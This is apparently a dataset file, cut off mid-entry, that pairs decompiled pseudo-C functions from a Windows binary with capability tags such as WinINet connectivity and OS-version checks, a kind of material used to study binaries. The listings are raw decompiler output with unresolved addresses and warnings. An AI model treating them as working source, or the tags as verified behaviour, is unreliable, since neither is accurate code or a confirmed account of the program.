    "0003db00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003db00(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t *piVar1;\n    uint var_1ch;\n    uint var_14h;\n    int16_t *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0xc0000225;\n    fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n    var_ch = *0xb1c5b4b8;\n    while( true ) {\n        if (var_ch == NULL) goto code_r0x0003dbab;\n        if (var_ch[1] == arg_8h) break;\n        var_ch = *var_ch;\n    }\n    var_10h = 0xb1be1f0c;\n    piVar1 = var_10h;\n    do {\n        var_10h = piVar1;\n        piVar1 = var_10h + 1;\n    } while (*var_10h != 0);\n    fcn.00078592(arg_ch, var_ch + (var_10h + 0x2720f07a >> 1) * 2 + 0x16, arg_10h);\n    *(arg_ch + -2 + arg_10h * 2) = 0;\n    var_4h = 0;\ncode_r0x0003dbab:\n    fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n    return var_4h;\n}\n",
        "token_count": 375
    },
    "0003dbd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003dbd0(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00034c90();\n    if (iVar2 < 0x1b) {\n        iVar2 = 0x21590001;\n    }\n    else {\n        iVar2 = fcn.0001b770(0xb1c5b4f0, 1, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0xb1bde044)();\n            iVar2 = fcn.00037ec0();\n            if (((((iVar2 == 0) && (iVar2 = fcn.00040810(*0xb1c5b0a4),  iVar2 == 0)) &&\n                 (iVar2 = fcn.00042370(*0xb1c5b0a4),  iVar2 == 0)) &&\n                ((((uVar1 < 0x14 || (iVar2 = fcn.00042b70(*0xb1c5b0a4),  iVar2 == 0)) &&\n                  ((iVar2 = fcn.0004ee40(),  iVar2 == 0 &&\n                   ((iVar2 = fcn.0003dda0(*0xb1c5b4b4),  iVar2 == 0 && (iVar2 = fcn.0003a340(),  iVar2 == 0)))))) &&\n                 (iVar2 = fcn.0003d3e0(),  iVar2 == 0)))) &&\n               (((iVar2 = fcn.0003c080(),  iVar2 == 0 && (iVar2 = fcn.00040d90(*0xb1c5b0a4),  iVar2 == 0)) &&\n                (iVar2 = fcn.000386a0(*0xb1c5b0a4),  iVar2 == 0)))) {\n                iVar2 = fcn.000390f0(*0xb1c5b0a4);\n            }\n        }\n        else {\n            iVar2 = 0x21590006;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 490
    },
    "0003dd70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0003dd70(void)\n\n{\n    if (*0xb1c5b4ec != 0) {\n        (**0xb1c5b3e4)(*0xb1c5b4ec);\n        *0xb1c5b4ec = 0;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0003dda0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0003dda0(uint arg_8h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uchar var_ch;\n    uchar var_bh;\n    ushort var_ah;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0xb1c5b4ec == 0) {\n        var_10h._0_1_ = 0x80;\n        var_10h._1_1_ = 1;\n        var_10h._2_2_ = 0x10;\n        var_ch = 0;\n        var_ah = 8;\n        var_8h = 0x6f6e624c;\n        var_bh = 1;\n        var_4h = 0x640;\n        *0xb1c5b4ec = (**0xb1c5b3e0)(arg_8h, &var_10h);\n    }\n    return 0;\n}\n",
        "token_count": 225
    },
    "0003de00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003de00(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45970;\n    uStack16 = 0xb1c4578a;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    puStack28 = &stack0xffffffa8;\n    var_30h = 0;\n    var_40h = 0;\n    iVar1 = fcn.00023560(0xfffffffe, 0x73, &var_28h, &var_3ch);\n    if (iVar1 == 0) {\n        var_40h = (**0xb1bde294)(var_3ch, var_28h << 6, 0, 0, 0);\n        var_4h = 0;\n        (**0xb1bde2a0)(var_40h, 0, 0);\n        var_4h = 0xffffffff;\n        for (var_2ch = 0; var_2ch < var_28h; var_2ch = var_2ch + 1) {\n            if ((*(var_3ch + 0xc + var_2ch * 0x40) == 0) || (*0xb1c5b4bc < *(var_3ch + 0xc + var_2ch * 0x40))) {\n                fcn.000236f0(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                             *(var_3ch + 4 + var_2ch * 0x40));\n            }\n            else {\n                fcn.00037150(0xb1c5b4c0, &var_1ch, 0);\n                var_34h = fcn.0003da90(var_2ch, 1);\n                if (var_34h == 0) {\n                    fcn.00037180(0xb1c5b4c0, &var_1ch, 0);\n                }\n                else if ((*(var_3ch + 0x14 + var_2ch * 0x40) == *(var_34h + 0x10)) &&\n                        (*(var_3ch + 0x18 + var_2ch * 0x40) == *(var_34h + 0x14))) {\n                    var_20h = *(var_3ch + 0x10 + var_2ch * 0x40);\n                    iVar1 = *(var_34h + 0x420);\n                    fcn.00037180(0xb1c5b4c0, &var_1ch, 0);\n                    if (var_20h != iVar1) {\n                        if (*(var_34h + 8) == 0) {\n                            fcn.00051320(var_2ch, var_20h);\n                        }\n                        else {\n                            fcn.0003bdf0(var_2ch, var_20h);\n                        }\n                    }\n                    if (*(var_3ch + 0x30 + var_2ch * 0x40) == 0) {\n                        var_24h = 0;\n                        var_38h = 0;\ncode_r0x0003e163:\n                        fcn.00037150(0xb1c5b4c0, &var_1ch, 0);\n                        var_34h = fcn.0003da90(var_2ch, 1);\n                        if (var_34h != 0) {\n                            fcn.00037150(var_34h + 0x424, &var_44h, 1);\n                            var_30h = *(var_34h + 0x418);\n                            *(var_34h + 0x418) = var_24h;\n                            *(var_34h + 0x41c) = var_38h;\n                            fcn.00037180(var_34h + 0x424, &var_44h, 1);\n                        }\n                        fcn.00037180(0xb1c5b4c0, &var_1ch, 0);\n                        fcn.00035330(var_30h);\n                    }\n                    else {\n                        var_24h = fcn.00035230(*(var_3ch + 0x30 + var_2ch * 0x40));\n                        if ((var_24h != 0) &&\n                           (iVar1 = fcn.000236a0(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                                                 *(var_3ch + 4 + var_2ch * 0x40), 0, var_24h, \n                                                 *(var_3ch + 0x30 + var_2ch * 0x40), &var_38h),  iVar1 == 0)) {\n                            if (var_38h % 8 == 0) {\n                                var_38h = var_38h >> 3;\n                                iVar1 = fcn.00065560(var_24h, var_38h);\n                                if (iVar1 != 0) goto code_r0x0003e163;\n                                fcn.000236f0(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                                             *(var_3ch + 4 + var_2ch * 0x40));\n                                fcn.00035330(var_24h);\n                            }\n                            else {\n                                fcn.000236f0(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                                             *(var_3ch + 4 + var_2ch * 0x40));\n                                fcn.00035330(var_24h);\n                            }\n                        }\n                    }\n                }\n                else {\n                    fcn.00037180(0xb1c5b4c0, &var_1ch, 0);\n                    fcn.000236f0(*(var_3ch + var_2ch * 0x40), *(var_3ch + 8 + var_2ch * 0x40), \n                                 *(var_3ch + 4 + var_2ch * 0x40));\n                }\n            }\n        }\n        (**0xb1bde29c)(var_40h);\n        (**0xb1bde2ac)(var_40h);\n        fcn.00023800(var_3ch);\n    }\n    *in_FS_OFFSET = var_10h;\n    return;\n}\n",
        "token_count": 1658
    },
    "0003e250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003e250(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0xc0000001;\n    *arg_14h = 0;\n    iVar1 = fcn.00020650(arg_10h, 0x1a, 2, &var_5ch, 4);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else if (var_5ch == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00020650(arg_10h, 0x1b, 3, &var_ch, 4);\n        if (iVar1 == 0) {\n            uVar2 = 0x21590066;\n        }\n        else {\n            var_44h = 0;\n            var_40h = 0;\n            var_3ch = 0;\n            var_48h = var_ch;\n            var_10h = fcn.0003d630(var_5ch, &var_4h);\n            if (var_10h != 0) {\n                fcn.000785b6(var_10h);\n            }\n            if (var_4h == 0) {\n                var_10h = fcn.00051320(var_5ch, var_ch);\n            }\n            else {\n                var_10h = fcn.0003bdf0(var_5ch, var_ch);\n            }\n            fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n            var_14h = fcn.0003da90(var_5ch, 1);\n            if (var_14h == 0) {\n                fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n                uVar2 = 0xc00000ef;\n            }\n            else {\n                if (var_10h == 0) {\n                    *(var_14h + 0x420) = var_ch;\n                }\n                var_44h = *(var_14h + 0x10);\n                var_40h = *(var_14h + 0x14);\n                fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n                iVar1 = fcn.000235a0(0xfffffffe, 0x73, &var_5ch, &var_58h);\n                if (iVar1 == 0) {\n                    fcn.000237c0(var_58h, var_50h, var_54h, 0, var_ch);\n                }\n                else {\n                    fcn.00023520(0xfffffffe, 0x73, var_5ch, 0, 0, &var_48h);\n                }\n                *(var_14h + 0x420) = var_ch;\n                uVar2 = fcn.000785b6(var_10h);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 820
    },
    "0003e3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0003e3f0(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint32_t var_2ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_14h = 0;\n    *arg_14h = 0;\n    iVar2 = fcn.00020650(arg_10h, 0x1a, 2, &var_68h, 4);\n    if (iVar2 == 0) {\n        var_70h = 0x21590065;\n    }\n    else if (var_68h == 0) {\n        var_70h = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.000205e0(arg_10h, 0x1c, 5, &var_8h, &var_5ch);\n        if (iVar2 == 0) {\n            var_8h = 0;\n            var_5ch = 0;\n        }\n        if (var_8h == 0) {\n            var_10h = 0;\n        }\n        else {\n            if (var_5ch % 8 != 0) {\n                return 0x21590066;\n            }\n            var_5ch = var_5ch >> 3;\n            for (var_ch = 0; var_ch < var_5ch; var_ch = var_ch + 1) {\n                uVar1 = fcn.000354c0(var_ch & 0xffff0000 | *(var_8h + var_ch * 8));\n                *(var_8h + var_ch * 8) = uVar1;\n                uVar3 = fcn.00035490(*(var_8h + 4 + var_ch * 8));\n                *(var_8h + 4 + var_ch * 8) = uVar3;\n            }\n            iVar2 = fcn.00065560(var_8h, var_5ch);\n            if (iVar2 == 0) {\n                return 0x21590066;\n            }\n            var_10h = fcn.00035230(var_5ch << 3);\n            if (var_10h == 0) {\n                return 0x21590004;\n            }\n            fcn.0007877e(var_10h, var_8h, var_5ch << 3);\n        }\n        fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n        var_14h = fcn.0003da90(var_68h, 1);\n        if (var_14h == 0) {\n            var_70h = 0x21590065;\n            fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n        }\n        else {\n            fcn.00037150(var_14h + 0x424, &var_6ch, 1);\n            var_8h = *(var_14h + 0x418);\n            *(var_14h + 0x418) = var_10h;\n            *(var_14h + 0x41c) = var_5ch;\n            fcn.00037180(var_14h + 0x424, &var_6ch, 1);\n            var_64h = *(var_14h + 0x10);\n            var_60h._0_2_ = *(var_14h + 0x14);\n            fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n            fcn.00035330(var_8h);\n            var_70h = 0;\n        }\n        if (var_70h == 0) {\n            iVar2 = fcn.000235a0(0xfffffffe, 0x73, &var_68h, &var_58h);\n            if (iVar2 == 0) {\n                if (var_2ch < var_5ch << 3) {\n                    fcn.000236f0(var_58h, var_50h, var_54h);\n                    fcn.00023520(var_58h, var_50h, var_4ch, var_10h, var_5ch << 3, &var_48h);\n                }\n                else {\n                    fcn.00023790(var_58h, var_50h, var_54h);\n                    fcn.00023660(var_58h, var_50h, var_54h, 0, var_10h, var_5ch << 3);\n                }\n            }\n            else {\n                var_3ch = 0;\n                var_48h = *(var_14h + 0x420);\n                var_44h = var_64h;\n                var_40h = var_60h;\n                fcn.00023520(0xfffffffe, 0x73, var_68h, var_10h, var_5ch << 3, &var_48h);\n            }\n        }\n    }\n    return var_70h;\n}\n",
        "token_count": 1327
    },
    "0003e6e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0003e6e0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n        iVar1 = fcn.0003d630(var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == 0) {\n                fcn.00051280(var_8h);\n            }\n            else {\n                fcn.0003be70(var_8h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "0003e740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003e740(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint var_b8h;\n    int16_t *var_b4h;\n    uint *var_b0h;\n    uint var_a8h;\n    int16_t *var_a4h;\n    int16_t *var_a0h;\n    uint var_98h;\n    int16_t *var_94h;\n    int16_t *var_90h;\n    uint var_8ch;\n    uint var_84h;\n    int16_t *var_80h;\n    uint var_7ch;\n    uint var_74h;\n    int16_t *var_70h;\n    uint var_6ch;\n    uint *var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = 3;\n    var_8h = 0;\n    var_4h = 0;\n    var_10h = 5;\n    var_ch = &var_64h;\n    var_64h = 0x27;\n    var_60h = 2;\n    var_5ch = 0x28;\n    var_58h = 4;\n    var_54h = 0x29;\n    var_50h = 3;\n    var_4ch = 0x31;\n    var_48h = 2;\n    var_44h = 0x3a;\n    var_40h = 4;\n    fcn.0003e6e0();\n    fcn.00037150(0xb1c5b4c0, &var_14h, 0);\n    var_8h = *0xb1c5b4bc;\n    var_4h = fcn.000352f0(*0xb1c5b4bc, 4);\n    if (var_4h == 0) {\n        var_6ch = 0x21590004;\n    }\n    else {\n        var_18h = 0;\n        for (var_68h = *0xb1c5b4b8; (var_18h < *0xb1c5b4bc && (var_68h != NULL)); var_68h = *var_68h) {\n            var_70h = var_68h + 0x216;\n            do {\n                iVar1 = *var_70h;\n                var_70h = var_70h + 1;\n            } while (iVar1 != 0);\n            uVar2 = fcn.00035200(var_10h * 0x10 + 0x26 + (var_70h - (var_68h + 0x86) >> 1) * 2);\n            *(var_4h + var_18h * 4) = uVar2;\n            if (*(var_4h + var_18h * 4) == 0) {\n                var_6ch = 0x21590004;\n                goto code_r0x0003ec6e;\n            }\n            fcn.00078790(*(var_4h + var_18h * 4), 0, var_10h << 4);\n            *(*(var_4h + var_18h * 4) + 4) = *(var_4h + var_18h * 4) + 8;\n            **(var_4h + var_18h * 4) = 4;\n            **(*(var_4h + var_18h * 4) + 4) = var_18h + 1;\n            *(*(var_4h + var_18h * 4) + 0x14) = var_10h * 0x10 + *(var_4h + var_18h * 4);\n            var_80h = var_68h + 0x216;\n            do {\n                iVar1 = *var_80h;\n                var_80h = var_80h + 1;\n            } while (iVar1 != 0);\n            *(*(var_4h + var_18h * 4) + 0x10) = (var_80h - (var_68h + 0x86) >> 1) * 2 + 2;\n            var_90h = var_68h + 0x216;\n            var_94h = *(*(var_4h + var_18h * 4) + 0x14);\n            do {\n                iVar1 = *var_90h;\n                *var_94h = iVar1;\n                var_90h = var_90h + 1;\n                var_94h = var_94h + 1;\n            } while (iVar1 != 0);\n            *(*(var_4h + var_18h * 4) + 0x24) = *(var_4h + var_18h * 4) + 0x28;\n            *(*(var_4h + var_18h * 4) + 0x20) = 4;\n            **(*(var_4h + var_18h * 4) + 0x24) = var_68h[0x108];\n            *(*(var_4h + var_18h * 4) + 0x34) = *(var_4h + var_18h * 4) + 0x38;\n            *(*(var_4h + var_18h * 4) + 0x30) = 4;\n            **(*(var_4h + var_18h * 4) + 0x34) = var_68h[0x107];\n            *(*(var_4h + var_18h * 4) + 0x40) = 0x24;\n            *(*(var_4h + var_18h * 4) + 0x44) =\n                 *(var_4h + var_18h * 4) + var_10h * 0x10 + *(*(var_4h + var_18h * 4) + 0x10);\n            if ((((*(var_68h + 4) == '\\0') && (*(var_68h + 0x11) == '\\0')) && (*(var_68h + 0x12) == '\\0')) &&\n               (((*(var_68h + 0x13) == '\\0' && (*(var_68h + 5) == '\\0')) && (*(var_68h + 0x15) == '\\0')))) {\n                var_a0h = 0xb1be1f20;\n                var_a4h = *(*(var_4h + var_18h * 4) + 0x44);\n                do {\n                    iVar1 = *var_a0h;\n                    *var_a4h = iVar1;\n                    var_a0h = var_a0h + 1;\n                    var_a4h = var_a4h + 1;\n                } while (iVar1 != 0);\n            }\n            else {\n                fcn.000785aa(&var_3ch, 0xb1be1f44, *(var_68h + 4), *(var_68h + 0x11), *(var_68h + 0x12), \n                             *(var_68h + 0x13), *(var_68h + 5), *(var_68h + 0x15));\n                var_b0h = &var_3ch;\n                var_b4h = *(*(var_4h + var_18h * 4) + 0x44);\n                do {\n                    iVar1 = *var_b0h;\n                    *var_b4h = iVar1;\n                    var_b0h = var_b0h + 2;\n                    var_b4h = var_b4h + 1;\n                } while (iVar1 != 0);\n            }\n            var_18h = var_18h + 1;\n        }\n        var_6ch = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n    }\ncode_r0x0003ec6e:\n    fcn.00037180(0xb1c5b4c0, &var_14h, 0);\n    if (var_4h != 0) {\n        for (var_18h = 0; var_18h < var_8h; var_18h = var_18h + 1) {\n            fcn.00035330(*(var_4h + var_18h * 4));\n        }\n    }\n    fcn.00035330(var_4h);\n    return var_6ch;\n}\n",
        "token_count": 2070
    },
    "0003ecd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003ecd0(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0xc0000001;\n    *arg_14h = 0;\n    iVar1 = fcn.00020650(arg_10h, 0x1a, 2, &var_18h, 4);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.000205e0(arg_10h, 0x1f, 5, &var_1ch, &var_14h);\n        if (iVar1 == 0) {\n            uVar2 = 0x21590066;\n        }\n        else {\n            fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n            var_10h = fcn.0003da90(var_18h, 0);\n            if (var_10h == 0) {\n                fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n                uVar2 = 0x21590065;\n            }\n            else if (*(var_10h + 0xc) == 0) {\n                var_4h = *(var_10h + 8);\n                fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n                if (var_4h == 0) {\n                    var_ch = fcn.00051340(var_18h, var_1ch, var_14h);\n                }\n                else {\n                    var_ch = fcn.0003bef0(var_18h, var_1ch, var_14h);\n                }\n                uVar2 = fcn.000785b6(var_ch);\n            }\n            else {\n                fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n                uVar2 = 0;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 546
    },
    "0003ede0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_218h\n\nvoid fcn.0003ede0(void)\n\n{\n    int32_t iVar1;\n    uint *var_218h;\n    uint var_12h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 1;\n    while( true ) {\n        fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n        iVar1 = fcn.0003da90(var_4h, 1);\n        if (iVar1 != 0) {\n            fcn.00078592(&var_218h, iVar1 + 0x16, 0x104);\n        }\n        fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n        if (iVar1 == 0) break;\n        var_218h = &var_218h;\n        fcn.0003f040(var_218h, 0xb1c5885c);\n        var_4h = var_4h + 1;\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "0003eea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003eea0(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_ch = fcn.0003f9b0(0xb1c58998, 0, &var_8h);\n    if (var_ch == 0) {\n        for (var_4h = 0; *(var_8h + var_4h * 4) != 0; var_4h = var_4h + 1) {\n            var_ch = fcn.0003f7f0(*(var_8h + var_4h * 4), 0xb1be1f80, &var_10h, &var_18h, &var_14h);\n            if (var_ch == 0) {\n                if (var_10h == 1) {\n                    iVar1 = fcn.000785bc(var_18h, 0xb1be1f98, 7);\n                    if (iVar1 == 0) {\n                        fcn.00035330(var_18h);\n                    }\n                    else {\n                        iVar1 = fcn.000785bc(var_18h, 0xb1be1fa8, 8);\n                        if (iVar1 == 0) {\n                            fcn.00035330(var_18h);\n                        }\n                        else {\n                            fcn.0003d7b0(var_18h);\n                            fcn.00035330(var_18h);\n                        }\n                    }\n                }\n                else {\n                    fcn.00035330(var_18h);\n                }\n            }\n        }\n        var_ch = 0;\n    }\n    fcn.0003f950(var_8h);\n    return var_ch;\n}\n",
        "token_count": 428
    },
    "0003efb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003efb0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_214h;\n    uint var_210h;\n    uint32_t var_4h;\n    \n    *arg_8h = 0;\n    for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n        iVar1 = fcn.0003db00(var_4h, &var_210h, 0x104);\n        if (((iVar1 == 0) && (iVar1 = fcn.0003f310(&var_210h, 0xb1c5885c, &var_214h),  iVar1 == 0)) && (var_214h == 0))\n        {\n            *arg_8h = 1;\n            fcn.0003f4a0(&var_210h, 0xb1c5885c);\n        }\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "0003f040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nint32_t __cdecl fcn.0003f040(uint arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_5ch;\n    uint var_54h;\n    int16_t *var_50h;\n    uint var_4ch;\n    uint var_44h;\n    int16_t *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    int16_t *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_8h = fcn.0003f9b0(0xb1c588d8, 0xb1be1fbc, &var_ch);\n    if (var_8h != 0) {\ncode_r0x0003f2fa:\n        fcn.0003f950(var_ch);\n        return var_8h;\n    }\n    var_4h = 0;\n    do {\n        if (*(var_ch + var_4h * 4) == 0) goto code_r0x0003f2e7;\n        var_1ch = 0;\n        var_20h = 0;\n        var_18h = 0;\n        var_8h = fcn.0003f7f0(*(var_ch + var_4h * 4), 0xb1be1fcc, &var_14h, &var_1ch, &var_2ch);\n        if (var_8h == 0) {\n            iVar2 = fcn.00078700(var_1ch, arg_8h);\n            if (iVar2 == 0) {\n                fcn.00035330(var_1ch);\n            }\n            else {\n                var_8h = fcn.0003f7f0(*(var_ch + var_4h * 4), 0xb1be1fdc, &var_14h, &var_20h, &var_2ch);\n                if (var_8h == 0) {\n                    var_30h = arg_ch;\n                    do {\n                        iVar1 = *var_30h;\n                        var_30h = var_30h + 1;\n                    } while (iVar1 != 0);\n                    var_10h = fcn.0003fd50(var_20h, var_2ch, arg_ch, var_30h - (arg_ch + 1) >> 1);\n                    if (var_10h == 0) {\n                        fcn.00035330(var_1ch);\n                        fcn.00035330(var_20h);\n                        var_8h = 0;\n                    }\n                    else {\n                        var_40h = arg_ch;\n                        do {\n                            iVar1 = *var_40h;\n                            var_40h = var_40h + 1;\n                        } while (iVar1 != 0);\n                        var_24h = var_10h + 2 + (var_40h - (arg_ch + 1) >> 1) * 